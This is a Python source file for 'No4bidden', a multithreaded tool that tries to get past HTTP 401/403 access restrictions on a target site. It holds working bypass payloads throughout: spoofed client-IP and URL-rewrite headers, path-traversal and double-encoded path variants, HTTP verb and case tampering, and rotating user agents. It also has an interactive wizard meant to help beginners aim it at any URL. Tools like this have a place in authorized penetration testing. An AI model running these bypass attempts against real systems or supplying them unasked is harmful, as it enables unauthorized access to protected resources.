#!/usr/bin/env python3
"""
No4bidden - Advanced 40X Bypass Tool in Python
A 40X bypass tool inspired by JANUS - Roman god of gates and passages
"""

import argparse
import requests
import sys
import time
import random
import json
import os
import threading
from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import base64
import shutil

class No4bidden:
    def __init__(self):
        self.clear_screen()
        self.banner = self.create_adaptive_banner()
        self.results = []
        self.lock = Lock()
        self.rate_limit_detected = False
        self.tested_combinations = set()
        self.verbose = False
        self.calibration_data = {}
        
        # Technique categories for organized output
        self.technique_categories = {
            'method_': '🔀 VERB TAMPERING',
            'verb_case_': '🔄 VERB TAMPERING CASE SWITCHING', 
            'header_': '📋 HEADERS',
            'path_': '🛤️ CUSTOM PATHS',
            'encoding_': '🔣 DOUBLE-ENCODING',
            'http_': '🌐 HTTP VERSIONS',
            'case_': '📝 PATH CASE SWITCHING',
            'combo_': '🎯 COMBINATION TECHNIQUES'
        }
        
        # Default payload directories structure
        self.payload_dirs = {
            'headers': 'payloads/headers',
            'paths': 'payloads/paths', 
            'encodings': 'payloads/encodings',
            'methods': 'payloads/methods'
        }
        
        # Default payloads if files not found
        self.default_payloads = {
            'headers': [
                'X-Original-URL',
                'X-Rewrite-URL', 
                'X-Forwarded-For: 127.0.0.1',
                'X-Forwarded-Host: 127.0.0.1',
                'X-Real-IP: 127.0.0.1',
                'X-Custom-IP-Authorization: 127.0.0.1',
                'X-Originating-IP: 127.0.0.1',
                'X-Remote-IP: 127.0.0.1',
                'X-Remote-Addr: 127.0.0.1',
                'X-Client-IP: 127.0.0.1',
                'X-Host: 127.0.0.1',
                'Referer',
                'X-Forwarded-Proto: http',
                'X-Forwarded-Proto: https',
                'X-Forwarded-Port: 80',
                'X-Forwarded-Port: 443',
            ],
            'paths': [
                '/',
                '/.',
                '/..',
                '/;',
                '/.;',
                '/..;',
                '/%2f',
                '/%252f',
                '/%2e%2e',
                '/%2e%2e%2f',
                '/..%2f',
                '/%252e%252e',
                '/%252e%252e%252f',
                '/..%255c',
                '/..%c0%af',
                '/%c0%ae%c0%ae/',
                '/..../',
                '/.../',
                '/....//',
                '/...//',
                '/..%2f..%2f',
                '/..%2f..%2f..%2f',
                '/.json',
                '/.xml',
                '/.txt',
                '/.bak',
                '/.old',
                '/.orig',
                '/.temp',
                '/.tmp',
            ],
            'encodings': [
                'url',
                'double-url',
                'base64',
                'unicode',
                'html',
            ],
            'methods': [
                'GET',
                'POST', 
                'PUT',
                'DELETE',
                'PATCH',
                'OPTIONS',
                'HEAD',
                'TRACE',
                'CONNECT',
                'PROPFIND',
                'get',
                'Get',
                'gEt',
                'geT',
                'GEt',
                'GeT',
                'gET',
            ]
        }
        
    def clear_screen(self):
        """Clear screen based on operating system"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_terminal_width(self):
        """Get current terminal width"""
        try:
            return shutil.get_terminal_size().columns
        except:
            return 80  # Default fallback width
    
    def center_text(self, text, width=None):
        """Center text based on terminal width"""
        if width is None:
            width = self.get_terminal_width()
        
        # Remove existing newlines and split by lines
        lines = text.strip().split('\n')
        centered_lines = []
        
        for line in lines:
            # Strip any existing whitespace and center
            stripped_line = line.strip()
            if stripped_line:
                centered_line = stripped_line.center(width)
                centered_lines.append(centered_line)
            else:
                centered_lines.append('')
        
        return '\n'.join(centered_lines)
    
    def create_adaptive_banner(self):
        return r"""
 ██████   █████          █████ █████  █████      ███      █████     █████                    
░░██████ ░░███          ░░███ ░░███  ░░███      ░░░      ░░███     ░░███                     
 ░███░███ ░███   ██████  ░███  ░███ █ ░███████  ████   ███████   ███████   ██████  ████████  
 ░███░░███░███  ███░░███ ░███████████ ░███░░███░░███  ███░░███  ███░░███  ███░░███░░███░░███ 
 ░███ ░░██████ ░███ ░███ ░░░░░░░███░█ ░███ ░███ ░███ ░███ ░███ ░███ ░███ ░███████  ░███ ░███ 
 ░███  ░░█████ ░███ ░███       ░███░  ░███ ░███ ░███ ░███ ░███ ░███ ░███ ░███░░░   ░███ ░███ 
 █████  ░░█████░░██████        █████  ████████  █████░░████████░░████████░░██████  ████ █████
░░░░░    ░░░░░  ░░░░░░        ░░░░░  ░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ 
                                                                                           
                   	            🚀 No4bidden v1.0 🚀                       		 	 
                     		  Author : Debajyoti0-0 👨🏻‍💻                         	 	 
               	          Opening gates where others see only walls..⚔️               	 	 
"""
    def display_banner(self):
        """Display the adaptive banner"""
        self.clear_screen()
        print(self.banner)
        print()  # Add some space after banner

    def wizard_interface(self):
        """Simple wizard interface for beginner users"""
        print("\n" + "="*50)
        print("🚀 No4bidden Wizard Interface")
        print("="*50)
        print("\nThis wizard will help you configure the tool step by step.")
        print("Press Enter to use default values.\n")
        
        # Get target URL
        url = input("🔗 Enter target URL (e.g., https://example.com/admin): ").strip()
        if not url:
            print("❌ URL is required!")
            return None
        
        # Add protocol if missing
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Get method
        method = input("📝 HTTP Method [GET]: ").strip().upper() or "GET"
        
        # Get headers
        headers = []
        print("\n➕ Custom Headers (leave empty to skip):")
        while True:
            header = input("  Header (format: Name: Value): ").strip()
            if not header:
                break
            headers.append(header)
        
        # Get proxy
        proxy = input("🔌 Proxy server (leave empty to skip): ").strip()
        
        # Get techniques
        print("\n🎯 Select bypass techniques:")
        print("  1. All techniques (recommended)")
        print("  2. Common techniques only")
        print("  3. Custom selection")
        
        tech_choice = input("  Enter choice [1]: ").strip() or "1"
        
        if tech_choice == "1":
            techniques = ['verbs', 'verbs-case', 'headers', 'endpaths', 'midpaths', 'double-encoding', 'http-versions', 'path-case']
        elif tech_choice == "2":
            techniques = ['verbs', 'headers', 'endpaths']
        else:
            print("\n  Available techniques:")
            print("  - verbs (HTTP methods)")
            print("  - headers (Custom headers)")
            print("  - paths (URL path manipulation)")
            print("  - encodings (URL encoding)")
            custom_tech = input("  Enter techniques (comma-separated): ").strip()
            techniques = [t.strip() for t in custom_tech.split(',')] if custom_tech else ['verbs', 'headers']
        
        # Get performance settings
        print("\n⚡ Performance Settings:")
        threads = input("  Threads [50]: ").strip()
        threads = int(threads) if threads.isdigit() else 50
        
        delay = input("  Delay between requests in ms [0]: ").strip()
        delay = int(delay) if delay.isdigit() else 0
        
        timeout = input("  Timeout in ms [10000]: ").strip()
        timeout = int(timeout) if timeout.isdigit() else 10000
        
        # Get output options
        print("\n📊 Output Options:")
        follow_redirects = input("  Follow redirects? [y/N]: ").strip().lower() == 'y'
        rate_limit = input("  Stop on rate limit? [y/N]: ").strip().lower() == 'y'
        unique = input("  Show only unique responses? [y/N]: ").strip().lower() == 'y'
        verbose = input("  Verbose output? [y/N]: ").strip().lower() == 'y'
        
        # Build args object
        class Args:
            pass
        
        args = Args()
        args.url = url
        args.method = method
        args.header = headers if headers else None
        args.proxy = proxy if proxy else None
        args.technique = techniques
        args.threads = threads
        args.delay = delay
        args.timeout = timeout
        args.redirect = follow_redirects
        args.rate_limit = rate_limit
        args.unique = unique
        args.verbose = verbose
        args.status_codes = None
        args.output_format = 'text'
        args.no_banner = False
        args.request_file = None
        args.payload_dir = None
        args.bypass_ip = None
        args.user_agent = None
        args.random_agent = False
        
        # Show configuration summary
        print("\n" + "="*50)
        print("✅ Configuration Summary")
        print("="*50)
        print(f"🎯 Target URL: {url}")
        print(f"📝 Method: {method}")
        print(f"🔧 Techniques: {', '.join(techniques)}")
        print(f"📋 Headers: {len(headers)}")
        print(f"⚡ Threads: {threads}")
        print(f"🔌 Proxy: {proxy if proxy else 'None'}")
        print(f"🔄 Follow redirects: {'Yes' if follow_redirects else 'No'}")
        print(f"🚫 Rate limit detection: {'Yes' if rate_limit else 'No'}")
        print("\n🎉 Ready to start scanning!")
        
        confirm = input("\n🚀 Start scan? [Y/n]: ").strip().lower()
        if confirm in ['', 'y', 'yes']:
            return args
        else:
            print("❌ Scan cancelled.")
            return None

    def print_section(self, title, width=50):
        """Print a section header with fancy formatting"""
        padding = (width - len(title) - 2) // 2
        print(f"\n{'━' * padding} {title} {'━' * (width - len(title) - padding - 2)}")

    def print_configuration(self, args, target_url):
        """Print configuration in beautiful format"""
        self.print_section("🔧 No4bidden CONFIGURATION", 60)
        
        config_items = [
            ("🎯 Target:", target_url),
            ("📋 Headers:", "✅ true" if args.header else "❌ false"),
            ("🔌 Proxy:", args.proxy if args.proxy else "❌ false"),
            ("👤 User Agent:", self.get_user_agent_display(args)),
            ("📝 Method:", args.method),
            ("📁 Payloads folder:", args.payload_dir if args.payload_dir else "payloads"),
            ("🌐 Custom bypass IP:", args.bypass_ip if hasattr(args, 'bypass_ip') and args.bypass_ip else "❌ false"),
            ("🔄 Follow Redirects:", "✅ true" if args.redirect else "❌ false"),
            ("🚫 Rate Limit detection:", "✅ true" if args.rate_limit else "❌ false"),
            ("📊 Status:", ", ".join(map(str, args.status_codes)) if args.status_codes else "all"),
            ("⏱️ Timeout (ms):", str(args.timeout)),
            ("💤 Delay (ms):", str(args.delay)),
            ("⚡ Threads:", str(args.threads)),
            ("🔍 Unique:", "✅ true" if args.unique else "❌ false"),
            ("📢 Verbose:", "✅ true" if args.verbose else "❌ false"),
        ]
        
        max_label_len = max(len(item[0]) for item in config_items)
        for label, value in config_items:
            print(f"{label:<{max_label_len}} {value}")

    def get_user_agent_display(self, args):
        """Get user agent for display"""
        if args.user_agent:
            return args.user_agent[:20] + "..." if len(args.user_agent) > 23 else args.user_agent
        elif args.random_agent:
            return "🎲 random"
        else:
            return "No4bidden"

    def auto_calibrate(self, session, target_url, args):
        """Perform auto-calibration to get baseline responses"""
        self.print_section("🎯 AUTO-CALIBRATION RESULTS", 60)
        
        # Test a non-existent path to get 404 baseline
        calibration_url = urljoin(target_url, f"/calibration_test_{random.randint(100000, 999999)}")
        
        try:
            response = self.make_request(
                session=session,
                url=calibration_url,
                method=args.method,
                timeout=args.timeout/1000,
                redirect=args.redirect
            )
            
            if response:
                if response.status_code == 404:
                    print(f"✅ [SUCCESS] Calibration URI: {calibration_url}")
                    print(f"✅ [SUCCESS] Status Code: {response.status_code}")
                    print(f"✅ [SUCCESS] Content Length: {len(response.content)} bytes")
                else:
                    print(f"⚠️  [WARNING] Calibration URI: {calibration_url}")
                    print(f"⚠️  [WARNING] Status Code: {response.status_code}")
                    print(f"⚠️  [WARNING] Content Length: {len(response.content)} bytes")
                
                self.calibration_data = {
                    'status': response.status_code,
                    'length': len(response.content),
                    'url': calibration_url
                }
            else:
                print("❌ [FAILED] Calibration failed - no response received")
                
        except Exception as e:
            print(f"❌ [ERROR] Calibration error: {e}")

    def test_default_request(self, session, target_url, args):
        """Test the default request first"""
        self.print_section("🌐 DEFAULT REQUEST", 40)
        
        response = self.make_request(
            session=session,
            url=target_url,
            method=args.method,
            timeout=args.timeout/1000,
            redirect=args.redirect
        )
        
        if response:
            status_color = self.get_status_color(response.status_code)
            reset = '\033[0m'
            status_emoji = self.get_status_emoji(response.status_code)
            print(f"{status_color}{status_emoji} {response.status_code:<6}{reset} {len(response.content):<8} bytes {response.url}")

    def get_status_emoji(self, status_code):
        """Get emoji for status code"""
        if 200 <= status_code < 300:
            return '✅'  # Success
        elif 300 <= status_code < 400:
            return '🔄'  # Redirect
        elif 400 <= status_code < 500:
            return '❌'  # Client error
        else:
            return '💀'  # Server error

    def print_results_by_category(self, args):
        """Print results organized by technique category"""
        # Group results by technique category
        categorized_results = {category: [] for category in self.technique_categories.values()}
        categorized_results['🔍 OTHER'] = []
        
        for result in self.results:
            category_found = False
            for tech_key, category_name in self.technique_categories.items():
                if result['technique'].startswith(tech_key):
                    categorized_results[category_name].append(result)
                    category_found = True
                    break
            if not category_found:
                categorized_results['🔍 OTHER'].append(result)
        
        # Print each category
        for category_name, results in categorized_results.items():
            if results:  # Only print categories with results
                self.print_section(category_name, 40 if len(category_name) < 25 else len(category_name) + 10)
                
                for result in results:
                    self.display_single_result(result, args)

    def display_single_result(self, result, args):
        """Display a single result with formatting"""
        status_color = self.get_status_color(result['status'])
        reset = '\033[0m'
        status_emoji = self.get_status_emoji(result['status'])
        
        # Truncate long URLs for display
        display_url = result['url']
        if len(display_url) > 80:
            display_url = display_url[:77] + "..."
        
        # Show technique name for non-default cases
        technique_info = ""
        if 'method_' in result['technique'] and result['technique'] != 'method_GET':
            technique_info = f" ({result['technique'].replace('method_', '')})"
        elif 'header_' in result['technique']:
            header_name = result['technique'].replace('header_', '')
            if ':' in header_name:
                header_name = header_name.split(':')[0]
            technique_info = f" ({header_name})"
        elif 'case_' in result['technique']:
            technique_info = f" ({result['technique'].replace('case_', '')})"
            
        print(f"{status_color}{status_emoji} {result['status']:<6}{reset} {result['content_length']:<8} bytes {display_url}{technique_info}")

    def print_banner(self):
        print(self.banner)
        print()

    def load_payloads_from_file(self, file_path):
        """Load payloads from file"""
        payloads = []
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads.append(line)
            except Exception as e:
                if self.verbose:
                    print(f"❌ [ERROR] Loading {file_path}: {e}")
        return payloads

    def load_all_payloads(self, custom_dir=None):
        """Load all payloads from directories"""
        payloads = {}
        base_dir = custom_dir or os.path.dirname(os.path.abspath(__file__))
        
        for payload_type, relative_path in self.payload_dirs.items():
            dir_path = os.path.join(base_dir, relative_path)
            type_payloads = []
            
            if os.path.exists(dir_path):
                # Load all files in the directory
                for filename in os.listdir(dir_path):
                    file_path = os.path.join(dir_path, filename)
                    if os.path.isfile(file_path):
                        type_payloads.extend(self.load_payloads_from_file(file_path))
            else:
                # Use default payloads
                type_payloads = self.default_payloads.get(payload_type, [])
            
            payloads[payload_type] = type_payloads
            
        return payloads

    def parse_request_file(self, file_path):
        """
        Parse HTTP request from file and extract:
        - URL
        - Method
        - Headers
        - Body
        """
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
            
            # Parse the request
            lines = content.split('\n')
            if not lines:
                raise ValueError("Empty request file")
            
            # Parse request line
            request_line = lines[0].strip()
            parts = request_line.split()
            if len(parts) < 2:
                raise ValueError("Invalid request line")
            
            method = parts[0]
            path = parts[1]
            
            # Parse headers
            headers = {}
            body = ""
            body_started = False
            
            for line in lines[1:]:
                line = line.strip()
                if not line:
                    body_started = True
                    continue
                
                if not body_started:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                else:
                    body += line + '\n'
            
            return {
                'method': method,
                'path': path,
                'headers': headers,
                'body': body.strip()
            }
            
        except Exception as e:
            print(f"❌ [ERROR] Parsing request file: {e}")
            return None

    def apply_encoding(self, payload, encoding_type):
        """Apply different encoding types to payload"""
        if encoding_type == 'url':
            return quote(payload)
        elif encoding_type == 'double-url':
            return quote(quote(payload))
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'unicode':
            return ''.join([f'%u{ord(c):04x}' for c in payload])
        elif encoding_type == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        else:
            return payload

    def parse_header(self, header_line):
        """Parse header line into key-value pair"""
        if ':' in header_line:
            key, value = header_line.split(':', 1)
            return key.strip(), value.strip()
        else:
            return header_line, ''

    def setup_session(self, args, request_data=None):
        """Setup requests session with configured options"""
        session = requests.Session()
        
        # Set headers - start with headers from request file if provided
        headers = {}
        if request_data and request_data.get('headers'):
            headers.update(request_data['headers'])
        
        # Add User-Agent
        headers['User-Agent'] = self.get_user_agent(args)
        
        # Add custom headers from command line
        if args.header:
            for header in args.header:
                key, value = self.parse_header(header)
                headers[key] = value
                
        session.headers.update(headers)
        
        # Set proxy
        if args.proxy:
            session.proxies = {
                'http': args.proxy,
                'https': args.proxy
            }
            
        return session

    def get_user_agent(self, args):
        """Get appropriate User-Agent"""
        if args.user_agent:
            return args.user_agent
        elif args.random_agent:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0'
            ]
            return random.choice(user_agents)
        else:
            return 'No4bidden/1.0'

    def make_request(self, session, url, method='GET', headers=None, data=None, timeout=10, redirect=False):
        """Make HTTP request with error handling"""
        if self.rate_limit_detected:
            return None
            
        try:
            request_headers = session.headers.copy()
            if headers:
                request_headers.update(headers)
                
            response = session.request(
                method=method.upper(),
                url=url,
                headers=request_headers,
                data=data,
                timeout=timeout,
                allow_redirects=redirect
            )
            
            return response
            
        except requests.exceptions.Timeout:
            if self.verbose:
                print(f"⏱️  [TIMEOUT] {url}")
        except requests.exceptions.ConnectionError:
            if self.verbose:
                print(f"🔌 [CONNECTION ERROR] {url}")
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"❌ [REQUEST ERROR] {url}: {e}")
                
        return None

    def test_bypass(self, session, original_url, technique_config, args, request_data=None):
        """Test a single bypass technique"""
        if self.rate_limit_detected:
            return
            
        # Create test combination
        combo_hash = hash(f"{technique_config.get('url', '')}{technique_config.get('method', '')}{str(technique_config.get('headers', {}))}")
        if combo_hash in self.tested_combinations:
            return
        self.tested_combinations.add(combo_hash)
        
        url = technique_config.get('url', original_url)
        method = technique_config.get('method', args.method)
        headers = technique_config.get('headers', {})
        technique_name = technique_config.get('name', 'unknown')
        
        # Use request data if provided
        if request_data:
            method = technique_config.get('method', request_data.get('method', args.method))
            # Merge headers
            headers = {**request_data.get('headers', {}), **headers}
        
        # Apply delay if specified
        if args.delay > 0:
            time.sleep(args.delay / 1000)
            
        response = self.make_request(
            session=session,
            url=url,
            method=method,
            headers=headers,
            data=request_data.get('body') if request_data else None,
            timeout=args.timeout/1000,
            redirect=args.redirect
        )
        
        if response is None:
            return
            
        # Check for rate limiting
        if response.status_code == 429:
            self.rate_limit_detected = True
            print("🚫 [RATE LIMIT] Rate limit (429) detected. Stopping.")
            return
            
        # Apply status code filtering
        if args.status_codes and response.status_code not in args.status_codes:
            return
            
        result = {
            'url': response.url,
            'status': response.status_code,
            'content_length': len(response.content),
            'technique': technique_name,
            'method': method,
            'headers': dict(response.headers),
            'response_time': response.elapsed.total_seconds() * 1000
        }
        
        with self.lock:
            self.results.append(result)

    def get_status_color(self, status_code):
        """Get color code for status code"""
        if 200 <= status_code < 300:
            return '\033[92m'  # Green
        elif 300 <= status_code < 400:
            return '\033[93m'  # Yellow
        elif 400 <= status_code < 500:
            return '\033[91m'  # Red
        else:
            return '\033[94m'  # Blue

    def generate_bypass_techniques(self, target_url, payloads, args, request_data=None):
        """Generate all bypass techniques to test"""
        techniques = []
        
        # Use path from request file if provided, otherwise parse from target_url
        if request_data and request_data.get('path'):
            base_path = request_data['path']
            # Construct full URL if path is relative
            if not base_path.startswith(('http://', 'https://')):
                parsed_target = urlparse(target_url)
                base_path = f"{parsed_target.scheme}://{parsed_target.netloc}{base_path}"
        else:
            parsed_url = urlparse(target_url)
            base_path = parsed_url.path

        # Method bypasses
        for method in payloads['methods']:
            techniques.append({
                'name': f'method_{method}',
                'method': method,
                'url': target_url
            })
            
        # Header bypasses
        for header_line in payloads['headers']:
            header_key, header_value = self.parse_header(header_line)
            
            # Handle special headers that need URL path as value
            if header_key in ['X-Original-URL', 'X-Rewrite-URL'] and not header_value:
                header_value = base_path
                
            techniques.append({
                'name': f'header_{header_key}',
                'headers': {header_key: header_value},
                'url': target_url
            })
            
        # Path bypasses (only if not using request file with specific path)
        if not request_data or not request_data.get('path'):
            for path_payload in payloads['paths']:
                new_url = urljoin(target_url, path_payload)
                techniques.append({
                    'name': f'path_{path_payload.replace("/", "_")}',
                    'url': new_url
                })
                
        # Encoding bypasses combined with paths
        for encoding in payloads['encodings']:
            for path_payload in payloads['paths'][:5]:  # Limit combinations
                encoded_payload = self.apply_encoding(path_payload, encoding)
                new_url = urljoin(target_url, encoded_payload)
                techniques.append({
                    'name': f'encoding_{encoding}_{path_payload.replace("/", "_")}',
                    'url': new_url
                })
                
        # Combination techniques (headers + methods)
        for header_line in payloads['headers'][:3]:  # Limit combinations
            for method in payloads['methods'][:3]:
                header_key, header_value = self.parse_header(header_line)
                techniques.append({
                    'name': f'combo_{method}_{header_key}',
                    'method': method,
                    'headers': {header_key: header_value},
                    'url': target_url
                })
                
        return techniques

    def run_scan(self, args):
        """Main scanning function"""
        self.verbose = args.verbose
        
        # Print banner unless disabled - ONLY IF NOT ALREADY PRINTED
        if not args.no_banner and not getattr(args, '_banner_printed', False):
            self.print_banner()
            args._banner_printed = True  # Mark banner as printed
        
        # Parse request file if provided
        request_data = None
        if args.request_file:
            print(f"📂 [LOADING] Loading request from: {args.request_file}")
            request_data = self.parse_request_file(args.request_file)
            if not request_data:
                print("❌ [ERROR] Failed to parse request file")
                return
            print(f"✅ [LOADED] Request: {request_data['method']} {request_data.get('path', 'N/A')}")
        
        target_url = args.url
        if request_data and request_data.get('path'):
            # If request file has a path, use it to construct the target URL
            if request_data['path'].startswith(('http://', 'https://')):
                target_url = request_data['path']
            else:
                parsed = urlparse(args.url)
                target_url = f"{parsed.scheme}://{parsed.netloc}{request_data['path']}"
        
        # Print configuration
        self.print_configuration(args, target_url)
        print()
        
        # Setup session
        session = self.setup_session(args, request_data)
        
        # Auto-calibration
        self.auto_calibrate(session, target_url, args)
        print()
        
        # Test default request
        self.test_default_request(session, target_url, args)
        print()
        
        # Load payloads and generate techniques
        print("📂 [LOADING] Loading payloads and generating techniques...")
        payloads = self.load_all_payloads(args.payload_dir)
        techniques_list = self.generate_bypass_techniques(target_url, payloads, args, request_data)
        print(f"✅ [GENERATED] {len(techniques_list)} test cases")
        print()
        
        # Run scan with thread pool
        print("🚀 [STARTING] Bypass attempts...\n")
        
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for technique in techniques_list:
                if self.rate_limit_detected:
                    break
                    
                future = executor.submit(
                    self.test_bypass, 
                    session, 
                    target_url, 
                    technique, 
                    args,
                    request_data
                )
                futures.append(future)
                
            # Wait for completion
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    if self.verbose:
                        print(f"❌ [THREAD ERROR] {e}")
        
        # Print organized results
        self.print_results_by_category(args)
        
        # Print summary
        self.print_summary(args, time.time() - start_time)

    def print_summary(self, args, duration):
        """Print scan summary"""
        self.print_section("📊 SCAN SUMMARY", 40)
        
        successful_bypasses = [r for r in self.results if r['status'] not in [403, 404, 401, 429]]
        
        print(f"🧪 Tests Performed:    {len(self.tested_combinations)}")
        print(f"📨 Responses Received: {len(self.results)}")
        print(f"🔍 Unique Combinations: {len(set((r['status'], r['content_length']) for r in self.results))}")
        print(f"🎯 Bypasses Found:     {len(successful_bypasses)}")
        print(f"⏱️  Scan Duration:      {duration:.2f}s")
        
        if self.rate_limit_detected:
            print("\n🚫 [RATE LIMITED] Scan stopped due to rate limiting")
        
        if successful_bypasses:
            print(f"\n✅ [SUCCESS] Successful bypass techniques:")
            unique_bypasses = set()
            for bypass in successful_bypasses:
                tech_name = bypass['technique']
                # Simplify technique names for display
                if tech_name.startswith('method_'):
                    tech_name = f"🔀 HTTP Method: {tech_name.replace('method_', '')}"
                elif tech_name.startswith('header_'):
                    tech_name = f"📋 Header: {tech_name.replace('header_', '').split(':')[0]}"
                elif tech_name.startswith('path_'):
                    tech_name = f"🛤️ Path: {tech_name.replace('path_', '')}"
                unique_bypasses.add(tech_name)
            
            for bypass in list(unique_bypasses)[:5]:  # Show first 5 unique
                print(f"    - {bypass}")
        else:
            print(f"\n❌ [NO BYPASSES] No successful bypasses found")


def main():
    # Create scanner instance
    scanner = No4bidden()
    
    # Print banner first (this will be the only place banner is printed)
    scanner.print_banner()
    
    parser = argparse.ArgumentParser(
        description='No4bidden - 40X Bypass Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''Examples:
  🎯 python3 No4bidden.py -u https://example.com/admin
  📂 python3 No4bidden.py -u https://example.com -r request.txt
  🔌 python3 No4bidden.py -u https://example.com -x http://127.0.0.1:8080 -v
  🧙 python3 No4bidden.py --wizard''',
        add_help=False
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', help='🎯 Target URL to test')
    
    # Request file option
    parser.add_argument('-r', '--request-file', help='📂 Load HTTP request from a file')
    
    # Payload options
    parser.add_argument('-p', '--payload-dir', help='📁 Custom payload directory')
    
    # Request options
    parser.add_argument('-m', '--method', default='GET', help='📝 HTTP method (default: GET)')
    parser.add_argument('-H', '--header', action='append', help='📋 Custom headers')
    parser.add_argument('-x', '--proxy', help='🔌 Proxy server')
    parser.add_argument('-t', '--timeout', type=int, default=10000, help='⏱️ Timeout in ms (default: 10000)')
    parser.add_argument('-d', '--delay', type=int, default=0, help='💤 Delay between requests in ms (default: 0)')
    parser.add_argument('--redirect', action='store_true', help='🔄 Follow redirects')
    
    # Bypass options
    parser.add_argument('-i', '--bypass-ip', help='🌐 Custom IP for bypass headers')
    
    # User agent options
    parser.add_argument('-a', '--user-agent', help='👤 Custom User-Agent')
    parser.add_argument('--random-agent', action='store_true', help='🎲 Use random User-Agent')
    
    # Performance options
    parser.add_argument('--threads', type=int, default=50, help='⚡ Number of threads (default: 50)')
    parser.add_argument('--rate-limit', action='store_true', help='🚫 Stop on rate limit detection')
    
    # Output options
    parser.add_argument('-s', '--status-codes', type=lambda s: [int(item) for item in s.split(',')], 
                       help='📊 Filter by status codes (comma-separated)')
    parser.add_argument('--output-format', choices=['text', 'json'], default='text', help='📄 Output format')
    parser.add_argument('--unique', action='store_true', help='🔍 Show only unique responses')
    parser.add_argument('-v', '--verbose', action='store_true', help='📢 Verbose output')
    
    # UI options
    parser.add_argument('--no-banner', action='store_true', help='🚫 Hide banner')
    
    # Miscellaneous options
    misc_group = parser.add_argument_group('Miscellaneous', 'These options do not fit into any other category')
    misc_group.add_argument('--wizard', action='store_true', help='🧙 Simple wizard interface for beginner users')
    
    # Help option
    parser.add_argument('-h', '--help', action='store_true', help='❓ Show help message')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Show help if requested
    if args.help:
        parser.print_help()
        print()
        sys.exit(0)
    
    # Handle wizard mode
    if args.wizard:
        wizard_args = scanner.wizard_interface()
        if wizard_args:
            # Mark banner as already printed since we printed it above
            wizard_args._banner_printed = True
            scanner.run_scan(wizard_args)
        sys.exit(0)
    
    # Show help if no URL provided
    if not args.url:
        print("❌ [ERROR] Target URL is required!")
        print("\n💡 Use --wizard for interactive mode or provide -u/--url argument.")
        print("\n📚 Examples:")
        print("  🎯 python3 No4bidden.py -u https://example.com/admin")
        print("  🧙 python3 No4bidden.py --wizard")
        sys.exit(1)
    
    # Validate and run scan
    if not args.request_file and not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
        
    try:
        # Mark banner as already printed since we printed it above
        args._banner_printed = True
        scanner.run_scan(args)
    except KeyboardInterrupt:
        print("\n⏹️  [INTERRUPTED] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ [ERROR] {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
